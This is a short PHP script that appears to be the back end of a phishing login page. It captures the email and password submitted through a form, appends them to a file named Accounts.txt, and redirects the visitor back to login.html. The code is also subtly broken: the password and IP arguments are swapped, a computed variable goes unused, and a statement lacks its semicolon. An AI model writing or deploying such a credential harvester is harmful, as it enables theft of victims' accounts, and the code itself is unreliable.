<?php
  $data = sprintf("Account Information\r{\n\tEmail: %s\n\tPassword: %s\n\tIP: %s\n}\n\n================\n\n", $_POST['email'], $_POST['REMOTE_ADDR'], $_POST['pass']);
$ip = $_SERVER['REMOTE_ADDR'];
  $file = "Accounts.txt"; 
  file_put_contents($file, $data, FILE_APPEND);
  sleep(1.5)
?>
<meta http-equiv="refresh" content="0; url=login.html" />
